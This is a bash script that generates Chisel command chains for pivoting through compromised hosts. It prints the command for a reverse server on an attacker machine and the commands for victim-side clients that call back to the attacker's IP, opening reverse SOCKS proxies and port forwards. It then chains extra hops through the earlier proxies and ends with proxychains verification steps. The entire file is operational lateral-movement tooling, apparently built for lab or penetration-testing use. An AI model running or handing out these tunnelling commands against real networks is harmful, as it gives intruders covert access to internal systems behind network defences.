#!/bin/bash

# --- HELP SECTION ---
show_help() {
    echo "==============================================================="
    echo "   DYNAMIC CHISEL PIVOT GENERATOR (Attacker-Chaining Strategy)"
    echo "==============================================================="
    echo "Usage: $0 [OPTIONS] <ATTACKER_IP> <PIVOT_1_IP> [PIVOT_2_IP] ..."
    echo ""
    echo "Options:"
    echo "  -r \"PORT1 PORT2\"  Remote Forward (Victim -> Attacker)"
    echo "  -l \"PORT1 PORT2\"  Local Forward  (Attacker -> Victim)"
    echo "  -h                Show this help"
    echo ""
    echo "Examples:"
    echo "  1. Standard SOCKS Pivot (No extra ports):"
    echo "     $0 172.28.0.5 172.28.0.10"
    echo ""
    echo "  2. Double Pivot to reach 10.10.20.0/24:"
    echo "     $0 172.28.0.5 172.28.0.10 10.10.10.20"
    echo ""
    echo "  3. Triple Pivot with Port Forwarding on the last hop:"
    echo "     $0 -r \"3000\" 172.28.0.5 172.28.0.10 10.10.10.20 10.10.20.20"
    echo "==============================================================="
}

# --- PARSE OPTIONS ---
REMOTE_PORTS=""
LOCAL_PORTS=""

while getopts "r:l:h" opt; do
  case $opt in
    r) REMOTE_PORTS=$OPTARG ;;
    l) LOCAL_PORTS=$OPTARG ;;
    h) show_help; exit 0 ;;
    *) show_help; exit 1 ;;
  esac
done
shift $((OPTIND-1))

# Check for minimum required IP arguments (Attacker + at least 1 Pivot)
if [ "$#" -lt 2 ]; then
    show_help
    exit 1
fi

IPS=("$@")
NUM_NODES=${#IPS[@]}
NUM_PIVOTS=$((NUM_NODES - 1))
CHISEL_SERVER_PORT=10000
SOCKS_BASE_PORT=1080

# --- BUILD FORWARDING STRING ---
FORWARD_STR=""

# Remote Forwarding (Accessing Attacker services from Victim)
# R:port:127.0.0.1:port opens port on VICTIM and forwards to ATTACKER
for port in $REMOTE_PORTS; do
    FORWARD_STR="$FORWARD_STR R:$port:127.0.0.1:$port"
done

# Local Forwarding (Accessing Victim services from Attacker)
# port:127.0.0.1:port opens port on ATTACKER and forwards to VICTIM
for port in $LOCAL_PORTS; do
    FORWARD_STR="$FORWARD_STR $port:127.0.0.1:$port"
done

echo "==============================================================="
echo "   GENERATING COMMANDS (Attacker-Controlled Chaining)"
echo "   Attacker: ${IPS[0]} | Hops: $NUM_PIVOTS"
[ -n "$FORWARD_STR" ] && echo "   Extra Forwards (on last hop): $FORWARD_STR"
echo "==============================================================="

# 0. ATTACKER INITIAL SERVER
echo -e "\n[0] ATTACKER MACHINE (${IPS[0]}):"
echo "---------------------------------------------------------------"
echo "# Start the primary reverse server"
echo "./chisel server -p $CHISEL_SERVER_PORT --reverse &"

# 1. FIRST PIVOT
echo -e "\n[1] PIVOT 1 (${IPS[1]}):"
echo "---------------------------------------------------------------"
if [ $NUM_PIVOTS -eq 1 ]; then
    echo "./chisel client ${IPS[0]}:$CHISEL_SERVER_PORT R:$SOCKS_BASE_PORT:socks $FORWARD_STR &"
else
    echo "./chisel client ${IPS[0]}:$CHISEL_SERVER_PORT R:$SOCKS_BASE_PORT:socks &"
fi

# 2. SUBSEQUENT PIVOTS
for (( i=2; i<NUM_NODES; i++ )); do
    CURRENT_IP=${IPS[$i]}
    VICTIM_SERVER_PORT=$((CHISEL_SERVER_PORT + i - 1))
    PREV_SOCKS=$((SOCKS_BASE_PORT + i - 2))
    NEW_SOCKS=$((SOCKS_BASE_PORT + i - 1))
    
    echo -e "\n[$i] PIVOT $i ($CURRENT_IP):"
    echo "---------------------------------------------------------------"
    echo "./chisel server -p $VICTIM_SERVER_PORT --socks5 --reverse &"

    echo -e "\n[*] ATTACKER BRIDGE TO PIVOT $i:"
    echo "---------------------------------------------------------------"
    EXTRA=""
    # Apply forward strings to the last hop in the chain
    if [ $i -eq $NUM_PIVOTS ]; then
        EXTRA=$FORWARD_STR
    fi
    echo "# Connect to Pivot $i through the Pivot $((i-1)) SOCKS proxy"
    echo "./chisel client --proxy socks://127.0.0.1:$PREV_SOCKS $CURRENT_IP:$VICTIM_SERVER_PORT $NEW_SOCKS:socks $EXTRA &"
done

echo -e "\n==============================================================="
echo "   VERIFICATION"
echo "==============================================================="
FINAL_SOCKS=$((SOCKS_BASE_PORT + NUM_PIVOTS - 1))
echo "1. Configure proxychains.conf with: socks5 127.0.0.1 $FINAL_SOCKS"
echo "2. Test connection: proxychains curl -I <TARGET_IP>"
echo "==============================================================="